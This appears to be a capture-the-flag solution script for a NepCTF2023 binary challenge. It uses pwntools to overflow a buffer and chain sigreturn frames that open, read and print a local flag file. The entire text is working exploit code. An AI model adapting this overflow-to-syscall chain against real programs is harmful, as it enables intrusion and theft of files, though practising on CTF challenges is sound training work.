from pwn import *
io = process("./pwn")
libc = ELF("./libc-2.27.so")
elf = ELF("./pwn")
context.log_level = 'debug'
context.arch = "amd64"

io.recvuntil("welcome to NepCTF2023!")
pop_rdi = 0x0000000000400813
syscall = 0x4005B0
bss_addr = elf.bss(0x500)
read_function = SigreturnFrame()
read_function.rdi = 0
read_function.rsi = 0
read_function.rdx = bss_addr-0x8
read_function.rcx = 0x500
read_function.rip = syscall
read_function.rsp = bss_addr

payload = cyclic(0x38)+p64(pop_rdi)+p64(0xf)+p64(syscall)+bytes(read_function)
io.send(payload)

open = SigreturnFrame()
open.rdi = 2
open.rsi = bss_addr-0x8
open.rdx = 0
open.rcx = 0
open.rip = syscall
open.rsp = bss_addr + 0x110

read_function = SigreturnFrame()
read_function.rdi = 0
read_function.rsi = 3
read_function.rdx = bss_addr - 0x200
read_function.rcx = 0x100
read_function.rip = syscall
read_function.rsp = bss_addr + 0x220

write_funtion = SigreturnFrame()
write_funtion.rdi = 1
write_funtion.rsi = 1
write_funtion.rdx = bss_addr - 0x200
write_funtion.rcx = 0x100
write_funtion.rip = syscall
write_funtion.rsp = bss_addr+0x30

payload = b'./flag\x00\x00'+p64(pop_rdi)+p64(0xf)+p64(syscall)+bytes(open)
payload = payload.ljust(0x108,b'\x00')+p64(pop_rdi)+p64(0xf)+p64(syscall)+bytes(read_function)
payload = payload.ljust(0x208,b'\x00')+p64(pop_rdi)+p64(0xf)+p64(syscall)+bytes(write_funtion)
io.send(payload)

io.recv()
io.recv()